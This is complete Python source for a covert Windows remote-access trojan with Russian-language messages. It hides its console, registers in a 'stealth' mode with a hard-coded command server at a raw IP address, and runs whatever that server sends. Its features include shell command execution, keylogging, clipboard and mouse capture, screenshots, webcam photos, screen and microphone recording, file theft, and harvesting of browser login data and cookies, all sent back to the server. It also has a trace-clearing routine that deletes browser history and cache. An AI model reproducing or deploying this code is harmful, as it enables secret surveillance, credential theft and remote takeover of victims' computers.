import requests
import socket
import time
import platform
import hashlib
from threading import Thread, Lock
import uuid
import shutil
import zipfile
import sys
import pyautogui
import os
import base64
import subprocess
import psutil
import ctypes
import json
import cv2
import numpy as np
import pyaudio
import wave
import keyboard as kb
from io import BytesIO
import win32gui
import win32con
import win32process
import pycaw.pycaw as pycaw
from comtypes import CLSCTX_ALL
from ctypes import POINTER, cast
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pyperclip
from pynput import mouse
import pythoncom
SERVER_URL = "http://193.124.121.76:4443"

def hide_console():
    if sys.platform == "win32":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)

hide_console()

def generate_device_id():
    pc_name = platform.node()
    unique_hash = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:6].upper()
    device_id = f"{pc_name}-{unique_hash}"
    return ''.join(e for e in device_id if e.isalnum() or e == '-')

def get_system_info():
    return {
        "name": platform.node(),
        "os": platform.system(),
        "release": platform.release(),
        "processor": platform.processor(),
        "ip": socket.gethostbyname(socket.gethostname())
    }

class PCClient:
    def __init__(self):
        self.device_id = generate_device_id()
        self.system_info = get_system_info()
        self.running = True
        # Кейлоггер
        self.keylog = []
        self.keylog_lock = Lock()
        self.keylogger_running = False
        # Мониторинг мыши
        self.mouse_log = []
        self.mouse_log_lock = Lock()
        self.mouse_monitor_running = False
        self.mouse_listener = None
        # Длительная запись аудио
        self.audio_recording = False
        self.audio_frames = []
        self.audio_thread = None
        
    def register_device(self):
        while self.running:
            try:
                data = {
                    "device_id": self.device_id,
                    "system_info": self.system_info,
                    "status": "online",
                    "stealth": True
                }
                
                response = requests.post(
                    f"{SERVER_URL}/register",
                    json=data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"Устройство {self.device_id} успешно зарегистрировано (СКРЫТЫЙ РЕЖИМ)")
                    return True
                else:
                    print(f"Ошибка регистрации: {response.status_code} - {response.text}")
                    time.sleep(30)
                    
            except requests.exceptions.RequestException as e:
                print(f"Ошибка подключения: {e}")
                time.sleep(30)
                
        return False
    
    def upload_large_file(self, file_path, file_type='file'):
        try:
            # Читаем файл чанками
            file_size = os.path.getsize(file_path)
            chunk_size = 10 * 1024 * 1024  # 10MB chunks
            
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    # Кодируем чанк в base64
                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                    
                    # Отправляем чанк на сервер
                    response = requests.post(
                        f"{SERVER_URL}/upload_chunk",
                        json={
                            "file_name": os.path.basename(file_path),
                            "file_data": chunk_b64,
                            "chunk_num": chunk_num,
                            "total_chunks": (file_size + chunk_size - 1) // chunk_size,
                            "file_type": file_type
                        },
                        timeout=30
                    )
                    
                    if response.status_code != 200:
                        return None, f"Ошибка загрузки чанка {chunk_num}"
                    
                    chunk_num += 1
            
            # Получаем итоговую ссылку
            response = requests.post(
                f"{SERVER_URL}/finalize_upload",
                json={
                    "file_name": os.path.basename(file_path),
                    "total_chunks": chunk_num
                },
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json().get("download_url"), "Файл успешно загружен"
            else:
                return None, "Ошибка финализации загрузки"
        
        except Exception as e:
            return None, f"Ошибка загрузки файла: {str(e)}"

    def get_directory_listing(self, path):
        try:
            if not os.path.exists(path):
                return f"Путь не существует: {path}", None, None
            
            items = os.listdir(path)
            listing = []
            for item in items:
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    listing.append(f"[DIR] {item}")
                else:
                    size = os.path.getsize(full_path)
                    listing.append(f"[FILE] {item} ({size} bytes)")
            
            result = "\n".join(listing)
            return f"Содержимое {path}:\n{result}", None, None
        except Exception as e:
            return f"Ошибка чтения директории: {str(e)}", None, None

    def download_file(self, path):
        try:
            if not os.path.exists(path):
                return f"Файл не существует: {path}", None, None
            
            if os.path.getsize(path) > 10 * 1024 * 1024:  # 10MB limit
                return "Файл слишком большой (макс. 10 МБ)", None, None
            
            with open(path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            return f"Файл {os.path.basename(path)} успешно прочитан", file_data, 'file'
        except Exception as e:
            return f"Ошибка чтения файла: {str(e)}", None, None

    def get_browser_data(self, browser):
        try:
            browser_paths = {
                'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
                'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data'),
                'opera': os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
                'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
            }
            
            if browser not in browser_paths:
                return f"Неизвестный браузер: {browser}", None, None
            
            path = browser_paths[browser]
            if not os.path.exists(path):
                return f"Путь к данным браузера не найден: {path}", None, None
            
            # Ищем важные файлы
            important_files = []
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower() in ['login data', 'cookies', 'history', 'web data', 'bookmarks', 'preferences']:
                        important_files.append(os.path.join(root, file))
            
            if not important_files:
                return f"Не найдены важные файлы для браузера {browser}", None, None
            
            # Создаем временный архив
            import tempfile
            temp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(temp_dir, f"{browser}_data.zip")
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in important_files:
                    try:
                        zipf.write(file, os.path.basename(file))
                    except Exception as e:
                        print(f"Ошибка добавления файла {file} в архив: {e}")
            
            with open(zip_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Удаляем временные файлы
            shutil.rmtree(temp_dir)
            
            return f"Данные браузера {browser} собраны", file_data, 'file'
        except Exception as e:
            return f"Ошибка получения данных браузера: {str(e)}", None, None
    def send_heartbeat(self):
        while self.running:
            try:
                response = requests.post(
                    f"{SERVER_URL}/heartbeat",
                    json={"device_id": self.device_id},
                    timeout=5
                )
                
                if response.status_code != 200:
                    print(f"Ошибка heartbeat: {response.text}")
                    
                print('heartbeat отправлен')
                time.sleep(60)
                
            except Exception as e:
                print(f"Ошибка отправки heartbeat: {e}")
                time.sleep(10)
    
    def check_commands(self):
        while self.running:
            try:
                response = requests.get(
                    f"{SERVER_URL}/commands?device_id={self.device_id}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json().get("commands", [])
                    for cmd in commands:
                        self.execute_command(cmd)
                elif response.status_code != 200:
                    print(f"Ошибка получения команд: {response.text}")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"Ошибка проверки команд: {e}")
                time.sleep(10)
    
    def execute_command(self, command):
        try:
            print(f"Получена команда: {command['command']}")
            result = ""
            file_data = None
            file_type = None
            cmd = command['command']
            if cmd.startswith('show_message:'):
                title = "Сообщение"
                text = cmd[len('show_message:'):]
                pyautogui.alert(text=text, title=title)
                result = f"Показано сообщение: {title} - {text}"
            elif cmd.startswith('hotkey:'):
                hotkey = cmd[len('hotkey:'):].replace(' ', '').lower()
                if hotkey in ["win+l", "win+L"]:
                    ctypes.windll.user32.LockWorkStation()
                    result = "Выполнена блокировка экрана (Win+L)"
                elif hotkey in ["ctrl+alt+delete", "ctrl+alt+del"]:
                    result = "Ошибка: Ctrl+Alt+Delete нельзя эмулировать программно в Windows"
                else:
                    try:
                        kb.press_and_release(hotkey)
                        result = f"Выполнена комбинация клавиш: {hotkey}"
                    except Exception as e:
                        result = f"Ошибка выполнения hotkey: {hotkey} — {e}"
            elif cmd.startswith('cmd:'):
                user_cmd = cmd[len('cmd:'):]
                try:
                    output = subprocess.check_output(user_cmd, shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866')
                except Exception as e:
                    output = str(e)
                lines = output.splitlines()
                if len(lines) > 30:
                    output = '\n'.join(lines[:30]) + '\n...Обрезано...'
                result = output
            elif cmd == 'processes':
                processes = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        processes.append(f"{proc.info['name']} ({proc.info['pid']})")
                    except Exception:
                        continue
                if len(processes) > 30:
                    result = '\n'.join(processes[:30]) + '\n...Обрезано...'
                else:
                    result = '\n'.join(processes)
            elif cmd.startswith('killprocess:'):
                proc = cmd[len('killprocess:'):].strip()
                killed = False
                for p in psutil.process_iter(['pid', 'name']):
                    try:
                        if str(p.info['pid']) == proc or p.info['name'].lower() == proc.lower():
                            p.kill()
                            killed = True
                    except Exception:
                        continue
                if killed:
                    result = f"Процесс {proc} завершён"
                else:
                    result = f"Процесс {proc} не найден или не завершён"
            elif cmd.startswith('open_image:'):
                import tempfile
                import webbrowser
                import base64
                img_data = cmd[len('open_image:'):]
                img_bytes = base64.b64decode(img_data)
                with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as f:
                    f.write(img_bytes)
                    img_path = f.name
                # Открыть на весь экран (Windows)
                os.startfile(img_path)
                result = "Изображение открыто на весь экран"
            elif cmd == 'screenshot':
                result, file_data, file_type = self.take_screenshot()
            elif cmd == 'webcam':
                result, file_data, file_type = self.capture_webcam()
            elif cmd == 'record_video_10':
                result, file_data, file_type = self.record_video(10)
            elif cmd == 'record_audio_10':
                result, file_data, file_type = self.record_audio(10)
            elif cmd == 'mouse_click':
                pyautogui.click()
                result = "Выполнен клик мыши"
            elif cmd == 'shutdown':
                subprocess.run(["shutdown", "/s", "/t", "0"])
                result = "Компьютер выключается"
            elif cmd == 'reboot':
                subprocess.run(["shutdown", "/r", "/t", "0"])
                result = "Компьютер перезагружается"
            elif cmd == 'lock':
                ctypes.windll.user32.LockWorkStation()
                result = "Компьютер заблокирован"
            elif cmd == 'sleep':
                subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                result = "Компьютер переведен в спящий режим"
            elif cmd.startswith('record_video_multi:'):
                try:
                    count = int(cmd.split(':')[1])
                except:
                    count = 3
                video_files = []
                for i in range(count):
                    res, fdata, ftype = self.record_video(10)
                    if fdata and ftype == 'video':
                        print(f"Отправка видеофрагмента {i+1}/{count}")
                        self.send_command_result(command['id'], f"Видео {i+1}/{count}", fdata, ftype)
                        video_files.append(fdata)
                result = f"Записано {len(video_files)} видео. Сервер склеит их."
            elif cmd == 'list_windows':
                def enum_handler(hwnd, windows):
                    if win32gui.IsWindowVisible(hwnd):
                        title = win32gui.GetWindowText(hwnd)
                        if title:
                            windows.append((hwnd, title))
                windows = []
                win32gui.EnumWindows(enum_handler, windows)
                result = '\n'.join([f"{hwnd}: {title}" for hwnd, title in windows])
            elif cmd.startswith('window_action:'):
                # window_action:{hwnd}:{action}
                parts = cmd.split(':')
                hwnd = int(parts[1])
                action = parts[2]
                if action == 'minimize':
                    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
                    result = f"Окно {hwnd} свернуто"
                elif action == 'restore':
                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                    result = f"Окно {hwnd} восстановлено"
                elif action == 'close':
                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                    result = f"Окно {hwnd} закрыто"
                else:
                    result = f"Неизвестное действие: {action}"
            elif cmd == 'system_info':
                cpu = psutil.cpu_percent(interval=1)
                ram = psutil.virtual_memory()
                disks = psutil.disk_partitions()
                disk_info = []
                for d in disks:
                    try:
                        usage = psutil.disk_usage(d.mountpoint)
                        disk_info.append(f"{d.device}: {usage.percent}% ({usage.used//(1024**3)}ГБ/{usage.total//(1024**3)}ГБ)")
                    except:
                        continue
                # GPU через wmic
                try:
                    gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True, encoding='cp866')
                    gpu = '\n'.join([line.strip() for line in gpu.splitlines() if line.strip() and 'Name' not in line])
                except:
                    gpu = 'Не удалось получить'
                result = f"CPU: {cpu}%\nRAM: {ram.percent}% ({ram.used//(1024**2)}МБ/{ram.total//(1024**2)}МБ)\nДиски:\n" + '\n'.join(disk_info) + f"\nGPU: {gpu}"
            elif cmd == 'volume_up_10':
                pythoncom.CoInitialize()
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                current = volume.GetMasterVolumeLevelScalar()
                volume.SetMasterVolumeLevelScalar(min(current + 0.1, 1.0), None)
                result = "Громкость увеличена на 10%"
            elif cmd == 'volume_down_10':
                pythoncom.CoInitialize()
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                current = volume.GetMasterVolumeLevelScalar()
                volume.SetMasterVolumeLevelScalar(max(current - 0.1, 0.0), None)
                result = "Громкость уменьшена на 10%"
            elif cmd == 'volume_mute':
                pythoncom.CoInitialize()
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                mute = volume.GetMute()
                volume.SetMute(1 if not mute else 0, None)
                result = "Mute переключен"
            elif cmd == 'keylogger_start':
                if not self.keylogger_running:
                    self.keylogger_running = True
                    Thread(target=self._keylogger_thread, daemon=True).start()
                    result = "Кейлоггер запущен"
                else:
                    result = "Кейлоггер уже работает"
            elif cmd == 'keylogger_stop':
                self.keylogger_running = False
                result = "Кейлоггер остановлен"
            elif cmd == 'keylogger_dump':
                with self.keylog_lock:
                    result = ''.join(self.keylog)[-1000:] or 'Лог пуст'
            elif cmd == 'keylogger_clear':
                with self.keylog_lock:
                    self.keylog.clear()
                result = "Лог кейлоггера очищен"
            elif cmd == 'mouse_monitor_start':
                if not self.mouse_monitor_running:
                    self.mouse_monitor_running = True
                    self.mouse_log = []
                    self.mouse_listener = mouse.Listener(on_move=self._on_mouse_move, on_click=self._on_mouse_click)
                    self.mouse_listener.start()
                    result = "Мониторинг мыши запущен"
                else:
                    result = "Мониторинг мыши уже работает"
            elif cmd == 'mouse_monitor_stop':
                self.mouse_monitor_running = False
                if self.mouse_listener:
                    self.mouse_listener.stop()
                    self.mouse_listener = None
                result = "Мониторинг мыши остановлен"
            elif cmd == 'mouse_monitor_dump':
                with self.mouse_log_lock:
                    result = '\n'.join(self.mouse_log)[-1000:] or 'Лог мыши пуст'
            elif cmd == 'apps_monitor':
                procs = [f"{p.info['name']} ({p.info['pid']})" for p in psutil.process_iter(['pid','name'])]
                result = '\n'.join(procs[:50])
            elif cmd == 'clipboard_monitor':
                try:
                    result = pyperclip.paste() or 'Буфер обмена пуст'
                except Exception as e:
                    result = f"Ошибка: {e}"
            elif cmd == 'clear_traces':
                try:
                    # Очистка temp
                    temp = os.environ.get('TEMP')
                    if temp:
                        for f in os.listdir(temp):
                            try:
                                fp = os.path.join(temp, f)
                                if os.path.isfile(fp):
                                    os.remove(fp)
                                elif os.path.isdir(fp):
                                    import shutil
                                    shutil.rmtree(fp)
                            except: pass
                    # Очистка истории Chrome
                    chrome = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\History"
                    if os.path.exists(chrome):
                        try:
                            os.remove(chrome)
                        except: pass
                    # Очистка кэша Chrome
                    cache = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Cache"
                    if os.path.exists(cache):
                        import shutil
                        shutil.rmtree(cache, ignore_errors=True)
                    result = "Следы очищены (temp, история, кэш)"
                except Exception as e:
                    result = f"Ошибка очистки: {e}"
            elif cmd.startswith('block_site:'):
                url = cmd[len('block_site:'):].strip()
                hosts = r"C:\Windows\System32\drivers\etc\hosts"
                try:
                    with open(hosts, 'a', encoding='utf-8') as f:
                        f.write(f"\n127.0.0.1 {url}\n")
                    result = f"Сайт {url} заблокирован"
                except Exception as e:
                    result = f"Ошибка: {e}\nЗапустите клиента от имени администратора для блокировки сайтов!"
            elif cmd.startswith('unblock_site:'):
                url = cmd[len('unblock_site:'):].strip()
                hosts = r"C:\Windows\System32\drivers\etc\hosts"
                try:
                    with open(hosts, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                    with open(hosts, 'w', encoding='utf-8') as f:
                        for line in lines:
                            if url not in line:
                                f.write(line)
                    result = f"Сайт {url} разблокирован"
                except Exception as e:
                    result = f"Ошибка: {e}"
            elif cmd.startswith('block_app:'):
                name = cmd[len('block_app:'):].strip().lower()
                killed = False
                for p in psutil.process_iter(['name']):
                    if p.info['name'].lower() == name:
                        p.kill()
                        killed = True
                result = f"Приложение {name} заблокировано (завершено)" if killed else f"Приложение {name} не найдено"
            elif cmd.startswith('unblock_app:'):
                # Просто сообщение, так как разблокировка — это не запуск
                result = f"Для разблокировки просто запустите приложение вручную"
            elif cmd == 'record_audio_start':
                if not self.audio_recording:
                    self.audio_recording = True
                    self.audio_frames = []
                    self.audio_thread = Thread(target=self._audio_record_thread, daemon=True)
                    self.audio_thread.start()
                    result = "Длительная запись аудио начата"
                else:
                    result = "Запись уже идет"
            elif cmd == 'record_audio_stop':
                if self.audio_recording:
                    self.audio_recording = False
                    self.audio_thread.join()
                    # Сохраняем и отправляем
                    temp_file = f"temp_audio_long_{self.device_id}.wav"
                    wf = wave.open(temp_file, 'wb')
                    wf.setnchannels(1)
                    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
                    wf.setframerate(44100)
                    wf.writeframes(b''.join(self.audio_frames))
                    wf.close()
                    with open(temp_file, "rb") as f:
                        audio_bytes = f.read()
                    os.remove(temp_file)
                    file_data = base64.b64encode(audio_bytes).decode('utf-8')
                    file_type = 'audio'
                    result = f"Длительная запись аудио завершена"
                else:
                    result = "Запись не велась"
            elif cmd.startswith('ls:'):
                path = cmd[len('ls:'):].strip()
                if path == 'desktop':
                    path = os.path.join(os.path.expanduser('~'), 'Desktop')
                elif path == 'downloads':
                    path = os.path.join(os.path.expanduser('~'), 'Downloads')
                elif path == 'documents':
                    path = os.path.join(os.path.expanduser('~'), 'Documents')
                result, file_data, file_type = self.get_directory_listing(path)
            elif cmd.startswith('download:'):
                path = cmd[len('download:'):].strip()
                result, file_data, file_type = self.download_file(path)
            elif cmd.startswith('browser:'):
                browser = cmd[len('browser:'):].strip().lower()
                result, file_data, file_type = self.get_browser_data(browser)
            self.send_command_result(command['id'], result, file_data, file_type)
        except Exception as e:
            print(f"Ошибка выполнения команды: {e}")
            self.send_command_result(command['id'], f"Ошибка: {str(e)}")
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            return "Скриншот выполнен", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
        except Exception as e:
            return f"Ошибка создания скриншота: {str(e)}", None, None
    
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                img_bytes = img_encoded.tobytes()
                return "Фото с веб-камеры сделано", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
            else:
                return "Не удалось получить фото с веб-камеры", None, None
        except Exception as e:
            return f"Ошибка доступа к веб-камере: {str(e)}", None, None
    
    def record_video(self, seconds):
        try:
            screen_size = (800, 600)
            fourcc = cv2.VideoWriter_fourcc(*'MJPG')
            temp_file = f"temp_screenvideo_{self.device_id}.avi"
            out = cv2.VideoWriter(temp_file, fourcc, 5.0, screen_size)
            start_time = time.time()
            frame_written = False
            while (time.time() - start_time) < min(seconds, 5):
                img = pyautogui.screenshot()
                img = img.resize(screen_size)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                out.write(frame)
                frame_written = True
            out.release()
            if not frame_written:
                return "Ошибка: не удалось записать видео (нет кадров)", None, None
            file_size = os.path.getsize(temp_file)
            if file_size > 45 * 1024 * 1024:
                os.remove(temp_file)
                return "Ошибка: видео слишком большое для отправки (более 45 МБ)", None, None
            with open(temp_file, "rb") as f:
                video_bytes = f.read()
            os.remove(temp_file)
            return f"Видео экрана записано (до 5 сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
        except Exception as e:
            return f"Ошибка записи видео: {str(e)}", None, None
    
    def record_audio(self, seconds):
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            RECORD_SECONDS = seconds
            temp_file = f"temp_audio_{self.device_id}.wav"
            p = pyaudio.PyAudio()
            try:
                stream = p.open(format=FORMAT,
                              channels=CHANNELS,
                              rate=RATE,
                              input=True,
                              frames_per_buffer=CHUNK)
            except Exception:
                # fallback на 1 канал
                CHANNELS = 1
                stream = p.open(format=FORMAT,
                              channels=CHANNELS,
                              rate=RATE,
                              input=True,
                              frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open(temp_file, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open(temp_file, "rb") as f:
                audio_bytes = f.read()
            os.remove(temp_file)
            return f"Аудио записано ({seconds} сек)", base64.b64encode(audio_bytes).decode('utf-8'), 'audio'
        except Exception as e:
            return f"Ошибка записи аудио: {str(e)}", None, None
    
    def send_command_result(self, command_id, result, file_data=None, file_type=None):
        data = {
            "device_id": self.device_id,
            "command_id": command_id,
            "result": result
        }
        
        if file_data and file_type:
            data["file_type"] = file_type
            data["file_data"] = file_data
        
        try:
            requests.post(
                f"{SERVER_URL}/command_result",
                json=data,
                timeout=30
            )
        except Exception as e:
            print(f"Ошибка отправки результата: {e}")
    
    def run(self):
        print(f"Запуск клиента с ID: {self.device_id}")
        
        if self.register_device():
            Thread(target=self.send_heartbeat, daemon=True).start()
            Thread(target=self.check_commands, daemon=True).start()
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("Клиент остановлен")

    def _keylogger_thread(self):
        import keyboard
        while self.keylogger_running:
            event = keyboard.read_event(suppress=False)
            if event.event_type == keyboard.KEY_DOWN:
                with self.keylog_lock:
                    self.keylog.append(event.name)
            time.sleep(0.01)

    def _on_mouse_move(self, x, y):
        if self.mouse_monitor_running:
            with self.mouse_log_lock:
                self.mouse_log.append(f"move: {x},{y}")

    def _on_mouse_click(self, x, y, button, pressed):
        if self.mouse_monitor_running:
            with self.mouse_log_lock:
                self.mouse_log.append(f"{'down' if pressed else 'up'}: {button} at {x},{y}")

    def _audio_record_thread(self):
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        while self.audio_recording:
            data = stream.read(1024)
            self.audio_frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()

if __name__ == '__main__':
    try:
        client = PCClient()
        client.run()
    except Exception as e:
        print(f"Фатальная ошибка: {e}")
        sys.exit(1)